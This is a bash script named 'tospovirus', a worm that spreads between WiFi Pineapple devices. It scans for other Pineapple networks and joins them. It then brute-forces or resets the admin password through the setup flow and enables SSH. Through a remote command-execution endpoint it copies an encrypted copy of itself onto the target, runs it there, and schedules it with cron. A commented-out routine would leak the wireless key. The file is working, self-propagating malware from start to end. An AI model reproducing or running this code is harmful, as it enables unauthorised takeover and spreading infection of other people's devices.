#!/bin/bash
base=/tospo
#Automate
if [ -e $base/pr ] ;
then
	rm $base/pr;
	echo "scheduling job..."
	printf "* * * * * $base/tv" | crontab -
	exit
fi
#Mark it
if grep -q "\"\$6[^\"]" /lib/wifi/mac80211.sh;
then
	sed -i -e 's/"\$6/"$6" "/' /lib/wifi/mac80211.sh
	uci set wireless.@wifi-iface[0].ssid="$(uci get wireless.@wifi-iface[0].ssid) "
	uci commit
	wifi
	exit
fi

#Concurrency check
if [ -e $base/tlock ] ; then
	exit
fi
touch $base/tlock

token="_csrfToken=a6f6832ff4df61608bf3e38b4facc7550e42244d&commands"
cmdurl="/components/system/configuration/functions.php?execute="
name="tospovirus"

self=`uci get wireless.@wifi-iface[0].ssid`
#disclose () {
	#Do this less often? One in five perhaps?
#	echo "Disclosing wireless management data..."
#	iwlist wlan1 scan essid "$(grep 'key' /etc/config/wireless|cut -d' ' -f8|head -c20|openssl rsautl -encrypt -pubin -inkey $base/d)"
#}
#-------------------------------------------------------------------------------------------------------------
pushstate() {
	echo "Pushing state..."
	uci export wireless >$base/w
	uci export network >$base/n
}
popstate () {
	echo "Popping state..."
	ifconfig br-lan 172.16.42.1 netmask 255.255.255.0 down
	ifconfig br-lan 172.16.42.1 netmask 255.255.255.0 up
	uci import -f $base/n
	uci commit network
	ifup
	uci import -f $base/w
	uci commit wireless
	wifi
}

reconfigure() {
	echo "Avoiding conflicts..."
	#Generate random ip...
	value=0
	while true
	do
		value=`dd if=/dev/urandom count=1 bs=1 2>/dev/null | hexdump -e '16/1 "%02d"' | cut -f1 | egrep -o "[1-9][0-9]*" | tr '\n' '\0'`
		if [ "$value" -gt 2 -a "$value" -lt 255 ]; then
			break
		fi 
	done
	echo "adjust ap to not conflict..."
	uci set wireless.@wifi-iface[0].mode='ap'
	uci set wireless.@wifi-iface[0].ssid="$self"
	uci set wireless.radio0.channel='1'
	uci set wireless.@wifi-iface[0].hidden='1'
	uci commit wireless

	echo "Fix up local settings too..."
	echo "uci set network.lan.ipaddr='172.16.42.$value'"
	uci set network.lan.ipaddr="172.16.42.$value"
	uci set network.lan.netmask='255.255.0.0'
	uci set network.lan.gateway='172.16.42.42'
	uci set network.lan.dns='8.8.8.8'
	uci commit network

	echo "Done avoiding conflicts..."
}

connect() {
	ssid=$1
	echo "Connecting to $ssid..."
	reconfigure
	
	echo "find lan device..."
	c=0
	while true
	do
		entry=$(uci get wireless.@wifi-iface[$c].network 2>&1)
		if [ "$entry" = "wan" ];
		then
			uci set wireless.@wifi-iface[$c].network='lan'
		elif [ "$entry" = "uci: Entry not found" ];
		then
			break
		fi
		c=$((c+1))
	done
	
	echo "Connect to the target..."
	uci set wireless.@wifi-iface[2].network=wan
	uci set wireless.@wifi-iface[2].mode=sta
	uci set wireless.@wifi-iface[2].ssid="$ssid"
	uci set wireless.@wifi-iface[2].hidden=0
	uci set wireless.@wifi-device[2].channel=11

	echo "Stripping keys..."	
	uci delete wireless.@wifi-iface[2].key
	uci delete wireless.@wifi-iface[2].encryption

	echo "uci commit wireless"	
	uci commit wireless
	wifi
}

post() {
	len=`printf "$2" | wc -c`
	printf "POST $1 HTTP/1.1\nHost:172.16.42.1:1471\nContent-Type:application/x-www-form-urlencoded\nCookie:PHPSESSID=$3\nContent-Length:$len\nConnection: close\n\n$2" | nc 172.16.42.1 1471
}

bf() {
	s1=`printf 'HEAD /?action=verify_pineapple HTTP/1.1\nHost: 172.16.42.1:1471\nConnection: close\n\n' | nc 172.16.42.1 1471 | egrep -o '[0-9a-z]{32}'`
	for try in `seq 1 56`
	do
	        post "/?action=verify_pineapple" "green=on&amber=on&blue=on&red=on&verify_pineapple=Continue" "$s1" | grep "password" && post "/?action=set_password" "password=pineapplesareyummy&password2=pineapplesareyummy&eula=1&sw_license=1&set_password=Set+Password" "$s1" | grep "success" && echo WIN && break;
	done
}

login() {
	echo "Logging in..."
	creds="username=root&password=pineapplesareyummy&login="
	post '/includes/api/login.php' "$creds" "$name" | grep -i 'invalid' && bf && post '/includes/api/login.php' "$creds" "$name" | grep -i 'invalid' && exit
}

handshake() {
	echo "Handshaking..."
	post "$cmdurl" "$token=/etc/init.d/sshd enable;/etc/init.d/sshd start;mkdir $base;openssl genrsa 512 >$base/pr%%26%%26openssl rsa -pubout -in $base/pr;" | awk '/-----BEGIN PUBLIC KEY-----/,/-----END PUBLIC KEY-----/' > $base/pu
}

infect() {
	echo "Encrypting key payload/infecting..."
	openssl rsautl -encrypt -inkey $base/pu -pubin -in $base/k -out $base/ek && \
	openssl aes-128-cbc -pass file:$base/k -in $base/tv -out $base/etv && \
	post "$cmdurl" "$token=printf \"\$(echo $(hexdump -e'16/1 "%02x"' $base/ek)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">$base/ek;printf \"\$(echo $(hexdump -e'16/1 "%02x"' $base/etv)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">$base/etv;printf \"\$(echo $(hexdump -e'16/1 "%02x"' d)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">$base/d;openssl rsautl -decrypt -inkey $base/pr -in $base/ek -out $base/k; openssl aes-128-cbc -d -pass file:$base/k -in $base/etv -out $base/tv; chmod u%%2Brx $base/tv; printf \"$base/at\">$base/at;at -f $base/at now;"
}

echo "Scanning for new devices..."
for net in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$self"`
do


	pushstate
	connect `echo $net | cut -d '"' -f 2`

	#Diagnostics----
	#uci show wireless
	#ping 172.16.42.1 -c 1
	#route -n
	#ifconfig
	#------

	echo "Generating random key..."
	openssl rand -base64 32 > $base/k

	#Login or exit on fail
	login
	#Request a public key from the remote
	handshake
	#Transfer the virus to the remote
	infect

	popstate
	break
done
rm $base/tlock
